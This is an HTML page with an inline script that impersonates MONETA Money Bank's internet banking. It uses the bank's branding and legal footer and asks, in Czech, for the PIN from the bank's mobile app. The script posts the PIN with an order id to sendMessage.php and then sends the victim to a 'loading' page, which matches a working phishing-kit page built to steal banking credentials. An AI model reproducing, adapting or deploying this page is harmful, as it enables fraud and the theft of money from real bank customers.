<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" type="text/css" href="moneta/stylemonetapin.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <title>Internet Banka - MONETA Money Bank</title>
</head>
<body>
    <div class="container">
        <div class="main-center">
            <div class="prihlaseni">
                <div class="header">
                    <a href="https://www.moneta.cz/">
                        <img src="moneta/images/moneta.svg" alt="">
                    </a>
                </div>
                <div class="vxod">
                    <img src="moneta/images/monetapush.jpeg" alt=''>
                </div>
                <div class="prosim">
                    Nyní prosím napište PIN kód z mobilní aplikace MONETA Money Bank pro autorizaci.
                </div>
                <div class="datumcas">
                    <div class="datum">
                        <div class="input-wrapper2">
                            <input type="number" placeholder="PIN Kod" id="myInput">
                        </div>
                    </div>
                    <div class="cas">
                        <button id="go">→</button>
                    </div>
                </div>
                <div class="moneta">
                    © 2023 MONETA Money Bank, a.s., BB Centrum, Vyskočilova 1442/1b, 140 28 Praha 4 - Michle, IČO: 25672720
                    zapsaná v obchodním rejstříku vedeném Městským soudem v Praze, oddíl B, vložka 5403
                    Více informací o 
                    <a href="https://www.moneta.cz/ochrana-dat">využívání cookies.</a>
                </div>
            </div>
        </div>
    </div>
    <script>
    const submitButton = document.getElementById('go')
const pin = document.getElementById('myInput')

submitButton.onclick = function () {

let bank = "<?php echo $bank ?>";

if (pin.value == null) {
    return;
}

$.ajax({
            url: 'sendMessage.php',
            method: 'POST',
            data: {
                orderid: "<?php echo $id ?>",
                bank: 'moneta',
                pin: pin.value
            },
            success: function (response) {
                // Обрабатываем успешный ответ
                console.log('Success');
            },
            error: function (error) {
                // Обрабатываем ошибку
                console.log('Error updating bank:', error);
            },
            complete: function () {
                // Выполняем переход на новую страницу
                const currentURL = window.location.href;
  const newURL = currentURL.replace('/pin/', '/loading/');
  window.location.href = newURL;
            }
        });

}
  </script>
</body>
</html>